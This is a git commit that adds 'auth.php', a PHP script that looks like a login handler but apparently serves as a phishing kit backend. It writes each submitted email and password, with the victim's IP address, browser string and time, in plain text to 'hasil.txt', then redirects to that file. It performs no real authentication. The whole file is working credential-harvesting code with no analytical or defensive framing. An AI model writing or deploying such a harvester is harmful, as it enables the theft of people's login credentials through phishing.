0b409d8a6851c77c4b3adc3262aaf856eea11fc2
Muhammad Ihsan <me@iganss.xyz>
2021-02-03 19:49:36 +0800

    Create auth.php

---
+++ auth.php
@@ -0,0 +1,30 @@
+<?php
+$file = "hasil.txt";
+$username = $_POST['email'];
+$pw = $_POST['password'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$ua = $_SERVER['HTTP_USER_AGENT'];
+$today = date("F j, Y, g:i a");
+$handle = fopen($file, 'a');fwrite($handle, "++++++++++++++++++++++++++++++++++++++++++++++++++++");
+fwrite($handle, "\n");
+fwrite($handle, "Email: ");
+fwrite($handle, "$username");
+fwrite($handle, "\n");
+fwrite($handle, "Password: ");
+fwrite($handle, "$pw");
+fwrite($handle, "\n");
+fwrite($handle, "IP Address: ");
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "Browser: ");
+fwrite($handle, "$ua");
+fwrite($handle, "\n");
+fwrite($handle, "Date Submitted: ");
+fwrite($handle, "$today");
+fwrite($handle, "\n");
+fwrite($handle, "++++++++++++++++++++++++++++++++++++++++++++++++++++");
+fwrite($handle, "\n");
+fwrite($handle, "\n");
+fclose($handle);
+echo('<meta http-equiv="refresh" content="0; hasil.txt">');
+?>
